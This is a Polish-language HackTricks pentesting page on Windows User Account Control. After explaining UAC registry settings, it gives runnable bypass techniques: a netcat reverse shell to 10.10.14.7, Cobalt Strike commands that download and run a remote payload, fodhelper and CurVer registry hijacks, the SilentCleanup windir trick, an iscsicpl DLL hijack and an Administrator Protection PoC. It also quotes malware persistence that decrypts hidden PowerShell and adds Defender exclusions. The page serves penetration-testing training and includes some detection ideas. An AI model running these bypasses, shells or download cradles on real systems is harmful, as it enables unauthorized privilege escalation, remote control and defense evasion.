# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogłyby potencjalnie zagrozić systemowi**. Gdy funkcja UAC jest włączona, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta innego niż administrator**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu do systemu na poziomie administratora. Jest to funkcja ułatwiająca pracę, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za security boundary.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych działań z poziomem medium integrity oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC i obejmuje proces logowania, user experience oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać security policies do konfigurowania działania UAC zgodnie z wymaganiami organizacji lokalnie (za pomocą secpol.msc) lub konfigurować te ustawienia i wdrażać je za pośrednictwem Group Policy Objects (GPO) w środowisku domenowym Active Directory. Różne ustawienia omówiono szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 Group Policy settings. Poniższa tabela zawiera dodatkowe informacje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**lokalne security policies** (na większości systemów dostępne jako "secpol.msc") są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać installer oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Registry Keys to Force UAC to Ask for Elevation

Jako standardowy użytkownik bez praw administratora możesz dopilnować, aby konto „standardowe” **było proszone przez UAC o podanie danych uwierzytelniających**, gdy próbuje wykonać określone działania. Wymaga to zmodyfikowania określonych **registry keys**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** lub attacker jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te zmuszają użytkownika do **ponownego wprowadzenia danych uwierzytelniających konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne dopiero po uzyskaniu elevated token, UAC bypass lub błędnej konfiguracji umożliwiającej zmianę tych kluczy; w przeciwnym razie sam zapis do registry zostanie zablokowany.**

Poniżej znajdują się registry keys i wpisy, które należy zmienić (w nawiasach podano ich wartości domyślne):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia danych uwierzytelniających.

### Uwaga

**User Account Control nie jest security boundary.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać praw administratora bez użycia local privilege escalation exploit.

### Poproś użytkownika o „pełny dostęp do komputera”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Uprawnienia UAC

- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom remote code execution, które próbują uzyskać dostęp do poufnych danych w systemie.
- Gdy użytkownik loguje się do Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, czyli poświadczeń używanych do uwierzytelniania użytkownika na komputerze i do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon` registry key**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tego tylko w bezpiecznych systemach, ponieważ hasło jest przechowywane w rejestrze.

Ustaw następujące klucze za pomocą Edytora rejestru lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **znacznie trudniej jest wykonać UAC bypass, jeśli poziom zabezpieczeń jest ustawiony na najwyższy (Always), niż gdy jest ustawiony na którykolwiek z pozostałych poziomów (Default).**

### Szybki triage z powłoki o średnim poziomie integralności

Przed próbą wykonania bypass potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładną kompilację zamiast zakładać niepowodzenie: UACME nadal obsługuje niektóre metody `AlwaysNotify compatible` we współczesnych kompilacjach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego jak:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom zabezpieczeń
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **bypass**owania **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated obiekty COM pozostają praktycznym wektorem UAC na współczesnych buildach. `ICMLuaUtil` jest nadal oznaczony przez UACME jako działający na aktualnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonanie 64-bitowe i czasami masquerading PEB/procesu przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, spróbuj ponownie z implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Zakładaj, że wykonanie procesu potomnego nastąpi w **oddzielnym podniesionym procesie**; wiele BOF-ów nie podnosi uprawnień bieżącego beacona in-place.

### KRBUACBypass

Dokumentacja i narzędzie znajdują się na stronie [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)to **kompilacja** kilku exploitów omijających UAC. Pamiętaj, że musisz **skompilować UACME za pomocą visual studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`); musisz wiedzieć, **którego potrzebujesz.**<sup>[[3]](#references)</sup>\
**Zachowaj ostrożność**, ponieważ niektóre bypasses będą **wyświetlać monity innych programów**, które **powiadomią** **użytkownika**, że coś się dzieje.<sup>[[3]](#references)</sup>

UACME zawiera **wersję builda, od której każda technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę wpływającą na używane przez Ciebie wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając ze [strony](https://en.wikipedia.org/wiki/Windows_10_version_history), można określić wydanie Windows `1607` na podstawie wersji builda.

Praktyczny workflow polega na tym, aby najpierw **ocenić build hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pozwala szybko odrzucić nieaktualne PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem umożliwiającym przypisanie bypassu do konkretnego buildu. Nowsze wydania dodały nowe metody i ponownie przetestowały istniejące metody w systemie **Windows 11 25H2**, dlatego przed założeniem, że stary wpis na blogu nadal ma zastosowanie bez zmian, sprawdź ponownie README i release notes.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany plik binarny `fodhelper.exe` jest automatycznie uruchamiany z podwyższonymi uprawnieniami w nowoczesnych systemach Windows. Po uruchomieniu odczytuje poniższą ścieżkę rejestru użytkownika bez weryfikowania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez wyświetlania monitu UAC.

Ścieżka rejestru odczytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw swój payload, a następnie go uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Dla zachowania stealth unikaj interfejsów UI wyświetlających monity.

#### Wariant hijack CurVer/extension (tylko HKCU)

Nowsze samples wykorzystujące `fodhelper.exe` pomijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości CurVer dla bieżącego użytkownika. Auto-elevated binary nadal rozwiązuje handler w `HKCU`, więc do utworzenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania mające na celu uniknięcie wykrycia (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysokim poziomem integralności. Typowe zadanie persistence przechowuje na dysku **zaszyfrowany za pomocą XOR skrypt PowerShell**, a następnie co godzinę dekoduje go i wykonuje w pamięci:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia tylko staged payloads, dlatego wykrywanie wymaga monitorowania **przejęcia `CurVer`**, manipulowania `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń w Defenderze lub scheduled tasks, które odszyfrowują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### Obejście UAC przez task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać wysoki poziom integralności bez okna zgody.<sup>[[8]](#references)</sup> Ta metoda nadal zasługuje na testowanie na nowszych buildach, ponieważ UACME utrzymuje tę technikę jako aktywną, a najnowsze śledzenie zgłoszeń wskazuje, że Windows 11 24H2 może wymagać jedynie niewielkich zmian w cudzysłowach.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Jeśli zadanie cytuje ścieżkę w tej wersji systemu, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po zakończeniu testów zawsze wyczyść `HKCU\Environment\windir`.

#### Więcej UAC bypass

Wiele klasycznych UAC bypass wykorzystujących przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczą.

Często można to rozwiązać za pomocą sesji **meterpreter**. Wykonaj migrację do **procesu**, który ma wartość **Session** równą **1**:

![Wskaż ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do procesu, który ma wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinno działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi; tak naprawdę nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia dodane przez UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), **niektóre narzędzia będą uruchomione jako administrator**, dzięki czemu możesz **uruchomić** na przykład **cmd** bezpośrednio **jako administrator**, bez ponownego wyświetlania monitu UAC, tak jak w przypadku [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli nie zależy Ci na pozostaniu niezauważonym, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **prosi o podniesienie uprawnień, dopóki użytkownik tego nie zaakceptuje**.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często poprzez sprawienie, że podniesiony binarny plik załaduje kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź plik binarny, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na poziomie wysokiej integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** bibliotekę DLL w pewnych **chronionych ścieżkach** (takich jak C:\Windows\System32), w których nie masz uprawnień do zapisu. Możesz to ominąć za pomocą:
1. **wusa.exe**: Windows 7,8 i 8.1. Umożliwia wyodrębnienie zawartości pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z poziomu wysokiej integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki i uruchomi podatny oraz automatycznie podnoszący uprawnienia plik binarny.

### Inna technika UAC bypass

Polega na obserwowaniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **pliku binarnego** lub **polecenia**, które ma zostać **wykonane** (jest to bardziej interesujące, jeśli plik binarny wyszukuje te informacje w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack użytkownika `PATH`

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwy plik `iscsiexe.dll` w folderze **zapisywalnym przez użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), tak aby ten folder był przeszukiwany, Windows może załadować DLL atakującego do podniesionego procesu `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktyczne uwagi:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale działa na poziomie **Medium Integrity** z powodu UAC.
- Kopia w katalogu **SysWOW64** jest właściwa dla tego bypassu. Traktuj kopię w katalogu **System32** jako osobny plik binarny i niezależnie zweryfikuj jego działanie.
- Podstawą jest połączenie **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon używany dla innych UAC bypass jest przydatny do potwierdzenia braku ładowania DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na wykrywanie:
- Generuj alerty dla `reg add` / zapisów do rejestru `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania warte osobnego sprawdzenia

Niektóre chainy opublikowane po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Przykładowo, poisoning activation-context cache może łączyć **remapowanie dysku** i **redirectowanie DLL**, aby przejść z poziomu medium do high integrity za pośrednictwem zaufanych interfejsów użytkownika / binariów auto-elevated, takich jak `ctfmon.exe`, a następnie celów takich jak `fodhelper.exe`. Zamiast duplikować tutaj duży PoC, sprawdź kompaktowe przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack litery dysku w ramach Administrator Protection (25H2) za pośrednictwem mapy urządzeń DOS dla sesji logowania

Pełny attack surface `RAiLaunchAdminProcess` / UIAccess w Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Funkcja „Administrator Protection” w Windows 11 25H2 używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do poszczególnych sesji. Katalog jest tworzony lazy przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker podszyje się pod token shadow-admin tylko na poziomie **SecurityIdentification**, katalog zostanie utworzony z attackerem jako **owner** (dziedziczy `CREATOR OWNER`), co pozwala tworzyć linki liter dysków mające priorytet przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji o niskich uprawnieniach wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu `runonce.exe` z tokenem shadow-admin.
2. Zduplikuj jego token główny do tokena typu **identification** i podszyj się pod niego podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z własnością attackera.
3. Utwórz dowiązanie symboliczne `C:` wskazujące na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając DLL/file hijack bez promptu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencje

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Zbiór technik UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – skaner zgodności i launcher UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: wykorzystanie 0-Day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie ochrony administratora Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass przy użyciu zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
